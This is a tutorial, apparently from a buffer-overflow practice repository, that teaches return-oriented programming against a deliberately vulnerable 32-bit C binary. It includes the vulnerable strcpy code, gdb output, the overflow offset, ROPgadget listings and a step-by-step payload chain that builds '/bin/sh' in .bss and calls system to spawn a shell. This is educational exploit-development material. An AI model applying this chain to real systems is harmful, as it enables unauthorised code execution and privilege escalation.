# Return oriented programming at its simplest form.

`rop.c` binary

```
#include <string.h>

#include <unistd.h>

int main (int argc, char **argv){
  char buf [1024];
  
  if(argc == 2){
    strcpy(buf, argv[1]);
  } else {
    system("/usr/bin/false");
  }
}
```
As you can see it is a simple binary prone to buffer overflow.

ASLR enabled : 

```
cat /proc/sys/kernel/randomize_va_space
2
```
Compiled with NX so stack is not executable (readelf -l rop) : 
```
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
```

We saw what kind of protections the binary has, now onto the exploitation part.

We could try and brute force the addresses since it is a 32bit binary but let's use other methods, more effective in order to bypass the ASLR. 

The method we are going to use is similar to "ret2plt", we are returning to functions already present in the binary but  what functions are we going to take advantage of?

Let's think about what exactly is our plan here, what functions exactly are we going to call.
After all it all comes down to popping a new shell with elevated privileges right.. well most of the times ;)  ? 

Lets make a plan of what we are going to need.

First, lets debug our binary in order to get an idea of what is hapenning.

```
Dump of assembler code for function main:
   0x0804844c <+0>:     push   ebp
   0x0804844d <+1>:     mov    ebp,esp
   0x0804844f <+3>:     and    esp,0xfffffff0
   0x08048452 <+6>:     sub    esp,0x410
   0x08048458 <+12>:    cmp    DWORD PTR [ebp+0x8],0x2
   0x0804845c <+16>:    jne    0x8048478 <main+44>
   0x0804845e <+18>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048461 <+21>:    add    eax,0x4
   0x08048464 <+24>:    mov    eax,DWORD PTR [eax]
   0x08048466 <+26>:    mov    DWORD PTR [esp+0x4],eax
   0x0804846a <+30>:    lea    eax,[esp+0x10]
   0x0804846e <+34>:    mov    DWORD PTR [esp],eax
   0x08048471 <+37>:    call   0x8048320 <strcpy@plt>
   0x08048476 <+42>:    jmp    0x8048484 <main+56>
   0x08048478 <+44>:    mov    DWORD PTR [esp],0x8048520
   0x0804847f <+51>:    call   0x8048330 <system@plt>
   0x08048484 <+56>:    leave  
   0x08048485 <+57>:    ret    
```

Aha, `0x8048320 <strcpy@plt>` and `0x8048330 <system@plt>`

What is that plt you might ask, well it stands for "Procedure Linkage Table" but because explaining this is out of scope i'll put some references below if you want to know more about it in detail.

Another intersting thing to notice is the size of the buffer, 4th line : `0x08048452 <+6>:     sub    esp,0x410` dont ask me how i know this.

Now everything here is represented in hex (base-16) so in order to find out the size of the buffer convert the number "410" base-16 to base-10, well that's one way to do it there are others also. 

Allright, since we know our binary is vulnerable to a buffer overflow it is time to find out how many bytes it requires to overwrite the return address

```
(gdb) r $(python -c 'print "\x41" * 1036') 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Buffer-Overflow-Practise/return-oriented-programming/rop $(python -c 'print "\x41" * 1036')

Program received signal SIGSEGV, Segmentation fault.
0xb7e99476 in _setjmp () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
```
We filled the buffer with 1036 bytes and it segfaulted, we didn't overwrite EIP yet, lets check where EIP points to.

```
Stack level 0, frame at 0xbffff880:
 eip = 0xb7e99476 in _setjmp; saved eip 0xb7e85e0b
 called by frame at 0x41414149
 Arglist at 0xbffff878, args: 
 Locals at 0xbffff878, Previous frame's sp is 0xbffff880
 Saved registers:
  eip at 0xbffff87c
 ```
 
 eip at **0xbffff87c** , right so, lets take a look at the Stack: 
 
```
(gdb) x/10xw $esp
0xbffff87c:     0xb7e85e0b      0x414140fd      0xbffff924      0xbffff930
0xbffff88c:     0xb7fe0860      0xb7ff6be1      0xffffffff      0xb7ffeff4
0xbffff89c:     0x0804826f      0x00000001
(gdb) x/10xw $esp - 4
0xbffff878:     0x41414141      0xb7e85e0b      0x414140fd      0xbffff924
0xbffff888:     0xbffff930      0xb7fe0860      0xb7ff6be1      0xffffffff
0xbffff898:     0xb7ffeff4      0x0804826f
```

We can see here that in order to overwrite the return address we need additional 4 byte but that's the *sweet* spot because later on the return address would be a function of our choosing and that's where things are getting interesting ;) 

Anyway lets proceed.

What do we have so far ?

- 1040 bytes to overwrite ret address 
- ASLR and NX enabled (so sniffing shellcode inside the stack or hardcoding a return address is not an option)
- Functions already present in the binary which they might prove to be useful (system and strcpy)

So we have a two functions which are useful, more important system!!

Yeah but how are we gonna call system with a shell lets say "/bin/sh" since it is not in the binary? 

Here is where ROP technique comes to the rescue, what rop basically does is chaining functions together but how you might ask. 
We basically creating a new stack frame on top of the other.
As we saw earlier every function has a return address, it needs to know when it is finished where to return to. 
That goes for every living function out there. 

Now the stack as we already goes as follows:

- call to the function
- return address 
- arguments

With that particular order so ret address goes immediately after the function call.


Finding out how strcpy works will help us in order to find out how we can copy our string into some memory point by us.
From the C manual we see that strcpy function goes as follows:

"The strcpy() function copies the string pointed by source (including the null character) to the character array destination. "

```char* strcpy(char* destination, const char* source);```

So the plan here is to create our string "/bin/sh" byte-by-byte into a memory which is writable. That's why i chose an address from .bss section it is unaffected from ASLR and it has pleny of space to store our string.

Now remember when i said that every function needs a return address ? 
Yeah, when we done copying one byte in order to copy the next one we need to re-call strcpy function again right?

How are we gonna do that ?

What we are looking for here are "gadgets" what these will actually do is help us chain functions together.
Gadgets are small instructions sequences ending with a "ret" instruction.
What this will do is pop the arguments from the stack and execute them. 
Remember "strcpy" function takes two arguments so we need a pop pop ret instruction.

A tool that does that job is ROPgadget.

Here is the output :
```
ROPgadget --binary rop

.....
0x08048513 : pop ecx ; pop ebx ; leave ; ret
0x080484f7 : pop edi ; pop ebp ; ret
0x080484f6 : pop esi ; pop edi ; pop ebp ; ret
0x08048490 : push ebp ; mov ebp, esp ; pop ebp ; ret
0x0804839c : push es ; ja 0x80483a5 ; ret
0x080483f0 : rcl byte ptr [esi - 0x2d00f7fc], 1 ; leave ; ret
0x080483b3 : rcl byte ptr [esi - 0x2f00f7fc], 1 ; leave ; ret
0x08048416 : rcl byte ptr [esi - 0x36fef7fc], 1 ; ret
0x080483d3 : rcl cl, 1 ; clc ; jne 0x80483e0 ; ret
0x080482ee : ret
0x080483ce : ret 0xeac1
0x080483b8 : ror cl, 1 ; ret
0x080483f5 : ror cl, cl ; ret
0x080483d4 : sar eax, 1 ; jne 0x80483df ; ret
0x080484fb : sbb al, 0x24 ; ret
0x080484f4 : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08048437 : sbb bh, al ; add al, 0x24 ; mov ah, 0x95 ; add al, 8 ; call eax
0x0804843c : xchg eax, ebp ; add al, 8 ; call eax
0x08048417 : xchg eax, esi ; add al, 8 ; add ecx, ecx ; ret
0x080483b4 : xchg eax, esi ; add al, 8 ; call eax
0x080483f1 : xchg eax, esi ; add al, 8 ; call edx
0x08048397 : xchg eax, esi ; add al, 8 ; cmp eax, 6 ; ja 0x80483aa ; ret
```
We are gonna choose "0x080484f7" to do our work.

We also need the "/bin/sh" characters in bytes of course in order to craft our string.
ROPgadget again to the rescue 

```
 ROPgadget --binary rop --memstr "/bin/sh"
Memory bytes information
=======================================================
0x08048134 : '/'
0x08048137 : 'b'
0x08048136 : 'i'
0x0804813e : 'n'
0x08048134 : '/'
0x08048142 : 's'
0x08048326 : 'h'
```
 
We have what we need,  to sum it up:

- stcrpy@plt 0x08048320 
- system@plt 0x08048330 
- .bss address (readelf -s rop | grep .bss)
- pop pop ret gadget 0x080484f7
- the addresses of "/bin/sh" obtained with ROPgadget

I would include the python code but it gets really boring, you can look it up in the repository, it also contains comments.
But i will put together the logic here of how we could construct the exploit.

```
1036 bytes exactly till ret address
strcpy@plt + pop_pop_ret_gadget  + bss + "/" 
strcpy@plt + pop_pop_ret_gadget  + bss + 1 + "b" #bss + 1 because if we use the same address it will overwrite the previous character
strcpy@plt + pop_pop_ret_gadget  + (bss + 2) + "i" 
strcpy@plt + pop_pop_ret_gadget  + (bss + 3) + "n"
strcpy@plt + pop_pop_ret_gadget  + (bss + 4) + "/"
strcpy@plt + pop_pop_ret_gadget  + (bss + 5) + "s"
strcpy@plt + pop_pop_ret_gadget  + (bss + 6) + "h"
system@plt + AAAA (ret_addr) + bss # AAAA as a ret_addr because we don't actually care where system is going to return to and  we are using the initial address of bss because now contains the whole string "/bin/sh"
```
That's it.
